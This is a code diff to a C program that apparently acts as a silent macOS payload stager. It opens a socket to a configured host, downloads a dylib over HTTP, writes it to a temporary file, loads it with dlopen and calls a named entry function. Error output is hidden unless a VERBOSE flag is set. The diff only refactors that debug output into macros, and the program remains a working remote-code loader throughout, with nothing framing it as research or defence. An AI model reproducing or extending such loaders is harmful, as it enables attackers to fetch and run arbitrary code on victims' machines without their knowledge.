@@ -14,6 +14,28 @@
 
 #define BUFFER_SIZE 4096
 
+#ifdef VERBOSE
+    #define DEBUG_PRINT(fmt, ...) \
+        do { \
+            fprintf(stdout, "DEBUG: " fmt "\n", ##__VA_ARGS__); \
+        } while (0)
+    #define DEBUG_PERROR(fmt, ...) \
+        do { \
+            fprintf(stderr, "DEBUG: " fmt ": %s\n", ##__VA_ARGS__, strerror(errno)); \
+        } while (0)
+    #define DEBUG_FPRINTF(stream, fmt, ...) \
+        do { \
+            fprintf(stream, "DEBUG: " fmt "\n", ##__VA_ARGS__); \
+        } while (0)
+#else
+    #define DEBUG_PRINT(fmt, ...) \
+        do { } while (0)
+    #define DEBUG_PERROR(fmt, ...) \
+        do { } while (0)
+    #define DEBUG_FPRINTF(stream, fmt, ...) \
+        do { } while (0)
+#endif
+
 struct Memory {
     char *data;
     size_t size;
@@ -44,17 +66,13 @@ int create_socket(const char *hostname, int port) {
 
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) {
-        #ifdef VERBOSE
-        perror("Error opening socket");
-        #endif
+        DEBUG_PERROR("Error opening socket");
         exit(1);
     }
 
     server = gethostbyname(hostname);
     if (!server) {
-        #ifdef VERBOSE
-        fprintf(stderr, "Error, no such host\n");
-        #endif
+        DEBUG_FPRINTF(stderr, "Error, no such host\n");
         exit(1);
     }
 
@@ -64,9 +82,7 @@ int create_socket(const char *hostname, int port) {
     memcpy(&server_addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
 
     if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        #ifdef VERBOSE
-        perror("Error connecting to server");
-        #endif
+        DEBUG_PERROR("Error connecting to server");
         exit(1);
     }
 
@@ -83,8 +99,7 @@ void send_http_get_request(int sockfd, const char *hostname, const char *path) {
     send(sockfd, request, strlen(request), 0);
 }
 
-struct Memory download_dylib(const char *hostname, const char *path) {
-    int sockfd = create_socket(hostname, PORT);
+struct Memory download_dylib(const char *hostname, const char *path, int sockfd) {
     send_http_get_request(sockfd, hostname, path);
 
     struct Memory mem = {0};
@@ -103,9 +118,7 @@ struct Memory download_dylib(const char *hostname, const char *path) {
 
                 mem.data = malloc(content_size);
                 if (!mem.data) {
-                    #ifdef VERBOSE
-                    perror("malloc failed");
-                    #endif
+                    DEBUG_PERROR("malloc failed");
                     close(sockfd);
                     exit(1);
                 }
@@ -117,9 +130,7 @@ struct Memory download_dylib(const char *hostname, const char *path) {
         } else {
             mem.data = realloc(mem.data, mem.size + bytes_read);
             if (!mem.data) {
-                #ifdef VERBOSE
-                perror("realloc failed");
-                #endif
+                DEBUG_PERROR("realloc failed");
                 close(sockfd);
                 exit(1);
             }
@@ -129,9 +140,7 @@ struct Memory download_dylib(const char *hostname, const char *path) {
     }
 
     if (bytes_read < 0) {
-        #ifdef VERBOSE
-        perror("recv failed");
-        #endif
+        DEBUG_PERROR("recv failed");
     }
 
     close(sockfd);
@@ -141,18 +150,14 @@ struct Memory download_dylib(const char *hostname, const char *path) {
 void *load_dylib_from_memory(struct Memory *mem) {
     void *mem_fd = mmap(NULL, mem->size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
     if (mem_fd == MAP_FAILED) {
-        #ifdef VERBOSE
-        perror("mmap failed");
-        #endif
+        DEBUG_PERROR("mmap failed");
         return NULL;
     }
 
     memcpy(mem_fd, mem->data, mem->size);
 
     if (mprotect(mem_fd, mem->size, PROT_READ | PROT_EXEC) == -1) {
-        #ifdef VERBOSE
-        perror("mprotect failed");
-        #endif
+        DEBUG_PERROR("mprotect failed");
         return NULL;
     }
 
@@ -160,9 +165,7 @@ void *load_dylib_from_memory(struct Memory *mem) {
     char temp_filename[] = TMP_FILENAME;
     int fd = mkstemp(temp_filename);
     if (fd == -1) {
-        #ifdef VERBOSE
-        fprintf(stderr, "Failed to create temporary file descriptor\n");
-        #endif
+        DEBUG_FPRINTF(stderr, "Failed to create temporary file descriptor\n");
         return NULL;
     }
 
@@ -171,9 +174,7 @@ void *load_dylib_from_memory(struct Memory *mem) {
 
     void *handle = dlopen(temp_filename, RTLD_NOW | RTLD_LOCAL);
     if (!handle) {
-        #ifdef VERBOSE
-        fprintf(stderr, "dlopen failed: %s\n", dlerror());
-        #endif
+        DEBUG_FPRINTF(stderr, "dlopen failed: %s\n", dlerror());
     }
 
     close(fd);
@@ -187,40 +188,30 @@ int main() {
 
     const char *hostname = HOST;
     const char *path = DYLIB_PATH;
+    int port = PORT;
+    int sockfd = create_socket(hostname, port);
 
-    #ifdef VERBOSE
-    printf("Downloading dylib from http://%s%s...\n", hostname, path);
-    #endif
-    struct Memory mem = download_dylib(hostname, path);
+    DEBUG_PRINT("Downloading dylib from http://%s%s...\n", hostname, path);
+    struct Memory mem = download_dylib(hostname, path, sockfd);
     if (mem.data == NULL || mem.size == 0) {
-        #ifdef VERBOSE
-        fprintf(stderr, "Failed to download the dylib\n");
-        #endif
+        DEBUG_FPRINTF(stderr, "Failed to download the dylib\n");
         return 1;
     }
 
-    #ifdef VERBOSE
-    printf("Downloaded %lu bytes\n", mem.size);
-    #endif
+    DEBUG_PRINT("Downloaded %lu bytes\n", mem.size);
 
     void *handle = load_dylib_from_memory(&mem);
     if (!handle) {
-        #ifdef VERBOSE
-        fprintf(stderr, "Failed to load dylib from memory\n");
-        #endif
+        DEBUG_FPRINTF(stderr, "Failed to load dylib from memory\n");
         free(mem.data);
         return 1;
     }
 
     void (*ENTRY_POINT_FUNC)() = dlsym(handle, ENTRY_POINT);
     if (!ENTRY_POINT_FUNC) {
-        #ifdef VERBOSE
-        fprintf(stderr, "dlsym failed: %s\n", dlerror());
-        #endif
+        DEBUG_FPRINTF(stderr, "dlsym failed: %s\n", dlerror());
     } else {
-        #ifdef VERBOSE
-        printf("Calling the function from the dylib...\n");
-        #endif
+        DEBUG_PRINT("Calling the function from the dylib...\n");
         ENTRY_POINT_FUNC();
     }
 
